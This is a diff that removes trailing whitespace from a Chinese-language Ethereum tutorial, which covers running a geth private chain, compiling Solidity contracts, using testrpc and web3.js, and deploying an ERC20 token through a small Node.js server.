@@ -15,7 +15,7 @@
 > - [图灵完备维基百科](https://en.wikipedia.org/wiki/Turing_completeness)
 > - [基于区块链的存证业务构想](https://zhuanlan.zhihu.com/p/33462619)
 > - [以太坊白皮书](https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%99%BD%E7%9A%AE%E4%B9%A6)
-> - [Ethereum Improvement Proposals (EIPs)](https://eips.ethereum.org/) 
+> - [Ethereum Improvement Proposals (EIPs)](https://eips.ethereum.org/)
 > - [以太坊搭建私链](https://souptacular.gitbooks.io/ethereum-tutorials-and-tips-by-hudson/content/private-chain.html)
 > - [以太坊 Web3.js 开发基础](https://www.jianshu.com/p/f3f36447546e)
 > - [Web3.js API 中文文档](http://web3.tryblockchain.org/index.html)
@@ -215,13 +215,13 @@ INFO [07-25|09:49:35.327] Loaded most recent local full block      number=0 hash
 INFO [07-25|09:49:35.327] Loaded most recent local fast block      number=0 hash=8f3035…7124e0 td=1
 INFO [07-25|09:49:35.327] Loaded local transaction journal         transactions=0 dropped=0
 INFO [07-25|09:49:35.327] Regenerated local transaction journal    transactions=0 accounts=0
-INFO [07-25|09:49:35.327] Starting P2P networking 
-INFO [07-25|09:49:35.328] started whisper v.6.0 
+INFO [07-25|09:49:35.327] Starting P2P networking
+INFO [07-25|09:49:35.328] started whisper v.6.0
 INFO [07-25|09:49:35.328] RLPx listener up                         self="enode://ad026d00f9ae6a7c2fae54aec6fe1692818a372aeae28418a1a0d5787809637e2b74c24038c15b734ef25a1b128915fbd75ae74aacedc428163b37346d872245@[::]:35685?discport=0"
 INFO [07-25|09:49:35.329] IPC endpoint opened                      url=/root/go/src/github.com/ethereum/go-ethereum/build/bin/data/geth.ipc
 INFO [07-25|09:49:35.329] Transaction pool price threshold updated price=18000000000
 INFO [07-25|09:49:35.329] Etherbase automatically configured       address=0x04f14C835B74f79B7dEf175C4e481929f9800501
-INFO [07-25|09:49:35.329] Starting mining operation 
+INFO [07-25|09:49:35.329] Starting mining operation
 INFO [07-25|09:49:35.329] Commit new mining work                   number=1 txs=0 uncles=0 elapsed=58.163µs
 WARN [07-25|09:49:35.330] Block sealing failed                     err="waiting for transactions"
 Welcome to the Geth JavaScript console!
@@ -420,7 +420,7 @@ INFO [07-25|16:58:43.662] Submitted transaction                    fullhash=0x4d
 ```bash
 > miner.start()
 INFO [07-25|16:58:52.395] Transaction pool price threshold updated price=1
-INFO [07-25|16:58:52.395] Starting mining operation 
+INFO [07-25|16:58:52.395] Starting mining operation
 null
 > INFO [07-25|16:58:52.396] Commit new mining work                   number=5 txs=1 uncles=0 elapsed=648.142µs
 INFO [07-25|16:58:52.397] Successfully sealed new block            number=5 hash=61063d…d19fce
@@ -460,7 +460,7 @@ WARN [07-25|16:58:52.399] Block sealing failed                     err="waiting 
 
 ```basic
 pragma solidity ^0.4.11;
- 
+
 contract Sample {
 
     uint public value;
@@ -479,7 +479,7 @@ contract Sample {
 }
 ```
 
-- 编译脚本，生成 ABI 接口和合约的二进制代码 
+- 编译脚本，生成 ABI 接口和合约的二进制代码
 
 > 备注：利用 [Remix](https://remix.ethereum.org) 在线编译合约
 
@@ -487,9 +487,9 @@ contract Sample {
 root:ethereum# solc --optimize --abi --bin sample.sol
 
 ======= sample.sol:Sample =======
-Binary: 
+Binary:
 608060405234801561001057600080fd5b50604051602080610114833981016040525160005560e1806100336000396000f30060806040526004361060525763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416633fa4f2458114605757806360fe47b114607b5780636d4ce63c146092575b600080fd5b348015606257600080fd5b50606960a4565b60408051918252519081900360200190f35b348015608657600080fd5b50609060043560aa565b005b348015609d57600080fd5b50606960af565b60005481565b600055565b600054905600a165627a7a723058207098d9dc5ae86fe75d1016078954658c002f112da516ed90f64c901feb340d870029
-Contract JSON ABI 
+Contract JSON ABI
 [{"constant":true,"inputs":[],"name":"value","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"v","type":"uint256"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"get","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"v","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]
 ```
 
@@ -789,7 +789,7 @@ Contract JSON ABI
 #### 安装 testrpc
 
 > - ethereumjs-testrpc 库后续被重命名为 Ganache CLI
-> - testrpc 不同于 geth，geth 是真正的以太坊环境，testrpc 是在本地使用内存模拟的一个以太坊环境，对于开发调试来说，更为方便快捷，当合约在 testrpc 中测试通过后，再部署到 geth 中去。 
+> - testrpc 不同于 geth，geth 是真正的以太坊环境，testrpc 是在本地使用内存模拟的一个以太坊环境，对于开发调试来说，更为方便快捷，当合约在 testrpc 中测试通过后，再部署到 geth 中去。
 
 ```bash
 root:~#  npm install -g ethereumjs-testrpc
@@ -803,10 +803,10 @@ updated 1 package in 11.83s
 
 #### 启动 testrpc
 
-> 会自动创建 10 个账户，每个账户默认有 100 个以太币 
+> 会自动创建 10 个账户，每个账户默认有 100 个以太币
 
 ```bash
-root:~# testrpc 
+root:~# testrpc
 EthereumJS TestRPC v6.0.3 (ganache-core: 2.0.2)
 
 Available Accounts
@@ -910,7 +910,7 @@ console.log(web3.eth.getBalance('0x3ead381b015ee447e753081f96b918350861417e'));
 - 执行脚本
 
 ```bash
-root:ethereum# node test.js 
+root:ethereum# node test.js
 0.20.1
 [ '0x931a85a8b24e00e5aa56651a64dd55f3c849fe14',
   '0x7a74f95c7b520f498b31fedcbffaa9a1b12a7dea',
@@ -953,7 +953,7 @@ BigNumber { s: 1, e: 0, c: [ 0 ] }
 pragma solidity ^0.4.24;
 
 /**
- * References: 
+ * References:
  * https://eips.ethereum.org/EIPS/eip-20
  * https://github.com/ethereum/EIPs/issues/20
  * https://github.com/OpenZeppelin/openzeppelin-solidity
@@ -1045,7 +1045,7 @@ contract StandardToken is ERC20 {
         name = _tokenName;                                  // Set the name for display purposes
         symbol = _tokenSymbol;                              // Set the symbol for display purposes
         decimals = _decimalUnits;                           // Amount of decimals for display purposes
-        owner = msg.sender;                                 // Set the owner    
+        owner = msg.sender;                                 // Set the owner
     }
 
     /**
@@ -1179,7 +1179,7 @@ contract StandardToken is ERC20 {
 
 ![](pic/blockchain/deploy_standard_token.png)
 
-查看页面下方的控制台，查看详情，找到合约地址 `0xef55bfac4228981e850936aaf042951f7b146e41` 
+查看页面下方的控制台，查看详情，找到合约地址 `0xef55bfac4228981e850936aaf042951f7b146e41`
 
 ![](pic/blockchain/deploy_standard_token2.png)
 
@@ -1229,8 +1229,8 @@ var standardtoken = standardtokenContract.new(
    _decimalUnits,
    _tokenSymbol,
    {
-     from: web3.eth.accounts[0], 
-     data: '0x60806040523480156200001157600080fd5b50604051620017b7380380620017b78339810180604052810190808051906020019092919080518201929190602001805190602001909291908051820192919050505083600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550836003819055508260009080519060200190620000b792919062000137565b508060019080519060200190620000d092919062000137565b5081600260006101000a81548160ff021916908360ff16021790555033600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050505050620001e6565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200017a57805160ff1916838001178555620001ab565b82800160010185558215620001ab579182015b82811115620001aa5782518255916020019190600101906200018d565b5b509050620001ba9190620001be565b5090565b620001e391905b80821115620001df576000816000905550600101620001c5565b5090565b90565b6115c180620001f66000396000f3006080604052600436106100ba576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde03146100bf578063095ea7b31461014f57806318160ddd146101b457806323b872dd146101df578063313ce56714610264578063661884631461029557806370a08231146102fa5780638da5cb5b1461035157806395d89b41146103a8578063a9059cbb14610438578063d73dd6231461049d578063dd62ed3e14610502575b600080fd5b3480156100cb57600080fd5b506100d4610579565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101145780820151818401526020810190506100f9565b50505050905090810190601f1680156101415780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561015b57600080fd5b5061019a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610617565b604051808215151515815260200191505060405180910390f35b3480156101c057600080fd5b506101c9610709565b6040518082815260200191505060405180910390f35b3480156101eb57600080fd5b5061024a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610713565b604051808215151515815260200191505060405180910390f35b34801561027057600080fd5b50610279610c34565b604051808260ff1660ff16815260200191505060405180910390f35b3480156102a157600080fd5b506102e0600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610c47565b604051808215151515815260200191505060405180910390f35b34801561030657600080fd5b5061033b600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610ed9565b6040518082815260200191505060405180910390f35b34801561035d57600080fd5b50610366610f22565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156103b457600080fd5b506103bd610f48565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156103fd5780820151818401526020810190506103e2565b50505050905090810190601f16801561042a5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561044457600080fd5b50610483600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610fe6565b604051808215151515815260200191505060405180910390f35b3480156104a957600080fd5b506104e8600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506112dd565b604051808215151515815260200191505060405180910390f35b34801561050e57600080fd5b50610563600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506114d9565b6040518082815260200191505060405180910390f35b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561060f5780601f106105e45761010080835404028352916020019161060f565b820191906000526020600020905b8154815290600101906020018083116105f257829003601f168201915b505050505081565b600081600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b6000600354905090565b6000600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482111515156107cc576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f66726f6d27732062616c616e636520697320756e73756666696369656e742e0081525060200191505060405180910390fd5b600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482111515156108e6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001807f76616c756520746f206265207472616e73666572656420697320756e6170707281526020017f6f7665640000000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415151561098b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f746f2773206164647265737320697320696e76616c696400000000000000000081525060200191505060405180910390fd5b6109dd82600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610a7282600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610b4482600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190509392505050565b600260009054906101000a900460ff1681565b600080600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490508083101515610d59576000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610ded565b610d6c838261156090919063ffffffff16565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b8373ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040518082815260200191505060405180910390a3600191505092915050565b6000600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60018054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610fde5780601f10610fb357610100808354040283529160200191610fde565b820191906000526020600020905b815481529060010190602001808311610fc157829003601f168201915b505050505081565b6000600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054821115151561109f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f62616c616e636520697320756e73756666696369656e742e000000000000000081525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614151515611144576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601a8152602001807f746172676574206164647265737320697320696e76616c69642e00000000000081525060200191505060405180910390fd5b61119682600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061122b82600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a36001905092915050565b600061136e82600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040518082815260200191505060405180910390a36001905092915050565b6000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600082821115151561156e57fe5b818303905092915050565b6000818301905082811015151561158c57fe5b809050929150505600a165627a7a72305820ea5c3e196330ed8fce5d0bf3d3d885bbfca4b8c4d3658539d798f1be545320b90029', 
+     from: web3.eth.accounts[0],
+     data: '0x60806040523480156200001157600080fd5b50604051620017b7380380620017b78339810180604052810190808051906020019092919080518201929190602001805190602001909291908051820192919050505083600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550836003819055508260009080519060200190620000b792919062000137565b508060019080519060200190620000d092919062000137565b5081600260006101000a81548160ff021916908360ff16021790555033600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050505050620001e6565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200017a57805160ff1916838001178555620001ab565b82800160010185558215620001ab579182015b82811115620001aa5782518255916020019190600101906200018d565b5b509050620001ba9190620001be565b5090565b620001e391905b80821115620001df576000816000905550600101620001c5565b5090565b90565b6115c180620001f66000396000f3006080604052600436106100ba576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde03146100bf578063095ea7b31461014f57806318160ddd146101b457806323b872dd146101df578063313ce56714610264578063661884631461029557806370a08231146102fa5780638da5cb5b1461035157806395d89b41146103a8578063a9059cbb14610438578063d73dd6231461049d578063dd62ed3e14610502575b600080fd5b3480156100cb57600080fd5b506100d4610579565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101145780820151818401526020810190506100f9565b50505050905090810190601f1680156101415780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561015b57600080fd5b5061019a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610617565b604051808215151515815260200191505060405180910390f35b3480156101c057600080fd5b506101c9610709565b6040518082815260200191505060405180910390f35b3480156101eb57600080fd5b5061024a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610713565b604051808215151515815260200191505060405180910390f35b34801561027057600080fd5b50610279610c34565b604051808260ff1660ff16815260200191505060405180910390f35b3480156102a157600080fd5b506102e0600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610c47565b604051808215151515815260200191505060405180910390f35b34801561030657600080fd5b5061033b600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610ed9565b6040518082815260200191505060405180910390f35b34801561035d57600080fd5b50610366610f22565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156103b457600080fd5b506103bd610f48565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156103fd5780820151818401526020810190506103e2565b50505050905090810190601f16801561042a5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561044457600080fd5b50610483600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610fe6565b604051808215151515815260200191505060405180910390f35b3480156104a957600080fd5b506104e8600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506112dd565b604051808215151515815260200191505060405180910390f35b34801561050e57600080fd5b50610563600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506114d9565b6040518082815260200191505060405180910390f35b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561060f5780601f106105e45761010080835404028352916020019161060f565b820191906000526020600020905b8154815290600101906020018083116105f257829003601f168201915b505050505081565b600081600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b6000600354905090565b6000600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482111515156107cc576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f66726f6d27732062616c616e636520697320756e73756666696369656e742e0081525060200191505060405180910390fd5b600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482111515156108e6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001807f76616c756520746f206265207472616e73666572656420697320756e6170707281526020017f6f7665640000000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415151561098b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f746f2773206164647265737320697320696e76616c696400000000000000000081525060200191505060405180910390fd5b6109dd82600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610a7282600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610b4482600660008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190509392505050565b600260009054906101000a900460ff1681565b600080600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490508083101515610d59576000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610ded565b610d6c838261156090919063ffffffff16565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b8373ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040518082815260200191505060405180910390a3600191505092915050565b6000600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60018054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610fde5780601f10610fb357610100808354040283529160200191610fde565b820191906000526020600020905b815481529060010190602001808311610fc157829003601f168201915b505050505081565b6000600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054821115151561109f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f62616c616e636520697320756e73756666696369656e742e000000000000000081525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614151515611144576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601a8152602001807f746172676574206164647265737320697320696e76616c69642e00000000000081525060200191505060405180910390fd5b61119682600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461156090919063ffffffff16565b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061122b82600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a36001905092915050565b600061136e82600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461157990919063ffffffff16565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040518082815260200191505060405180910390a36001905092915050565b6000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600082821115151561156e57fe5b818303905092915050565b6000818301905082811015151561158c57fe5b809050929150505600a165627a7a72305820ea5c3e196330ed8fce5d0bf3d3d885bbfca4b8c4d3658539d798f1be545320b90029',
      gas: '4700000'
    }, function (e, contract){
     console.log(e, contract);
@@ -1258,7 +1258,7 @@ Contract mined! address: 0x7f224de3c7276312ac8cca8b822ca2d1579d2197 transactionH
 
 点击上图中合约地址链接（或直接根据合约地址查询），查询合约详细信息
 
-![](pic/blockchain/standard_token_contract2.png) 
+![](pic/blockchain/standard_token_contract2.png)
 
 可以点击 `Code`，填写合约名称、编译器版本、是否启用优化，提交合约源码，进行验证，验证同步哦之后，如下所示
 
@@ -1317,7 +1317,7 @@ http.createServer(function(req, res) {
 			res.write(body);
 			res.end();
 
-			console.log("url: ", req.url, ", method: ", req.method, 
+			console.log("url: ", req.url, ", method: ", req.method,
 				", params: ", params);
 
 			return;
@@ -1352,15 +1352,15 @@ http.createServer(function(req, res) {
 
 
 		var standardtoken = standardtokenContract.new(
-			initialSupply, 
-			tokenName, 
-			decimalUnits, 
+			initialSupply,
+			tokenName,
+			decimalUnits,
 			tokenSymbol,
 			{
-				from: web3.eth.accounts[0], 
-				data: standardtokenABI, 
+				from: web3.eth.accounts[0],
+				data: standardtokenABI,
 				gas: '4700000'
-			}, 
+			},
 			function (e, contract) {
 				//console.log(e, contract);
 				if (typeof contract.address !== 'undefined') {
@@ -1383,6 +1383,192 @@ http.createServer(function(req, res) {
 curl http://localhost:12306 -d '{"initialSupply":1000,"tokenName":"Hello World Token","decimalUnits":18,"tokenSymbol":"HWT"}'
